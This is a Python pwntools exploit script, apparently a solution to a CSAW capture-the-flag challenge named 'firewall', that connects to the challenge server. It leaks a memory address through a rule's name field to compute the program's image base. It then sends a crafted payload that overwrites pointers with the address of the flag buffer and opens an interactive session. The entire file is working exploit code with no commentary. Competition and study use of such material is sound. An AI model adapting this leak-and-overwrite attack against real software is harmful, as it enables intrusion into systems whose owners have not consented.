from pwnlib import *
from pwnlib.util.packing import *
from pwnlib.tubes.process import process
from pwnlib.tubes.remote import remote
from hexdump import hexdump
import sys

off_to_flag_buf = 0x12b31

p = remote('firewall.chal.csaw.io', 4141)

print p.recvuntil(":")
p.sendline("352762356") # access token
print p.recvuntil(":")
p.sendline("1") # add dummy rule
print p.recvuntil(":")
p.sendline("a")
print p.recvuntil(":")
p.sendline("1337")
print p.recvuntil(":")
p.sendline("TCP")
print p.recvuntil("MENU")
p.sendline("")
print p.recvuntil(":")
p.sendline("4") # leak memory address with rule 0
print p.recvuntil(":")
p.sendline("0")
name_buff = p.recvuntil("MENU")
name_buff = name_buff[name_buff.find("Name: ")+6:]
name_buff = name_buff[:name_buff.find("\n")]
image_base = unpack(name_buff[3:7], word_size=32, endianness='little', sign='unsigned') - 0xf168
print "Image base: ", image_base
p.sendline("")
print p.recvuntil(":")
p.sendline("2")
print p.recvuntil(":")
p.sendline("0")
print p.recvuntil(":")
p.sendline(p32(image_base + 0xf168)[1:] + p32(image_base + off_to_flag_buf) * 15)
print p.recvuntil(":")
p.sendline("0")
print p.recvuntil(":")
p.sendline(p32(image_base + 0xf168))
print p.recvuntil("MENU")
p.sendline("")
p.interactive()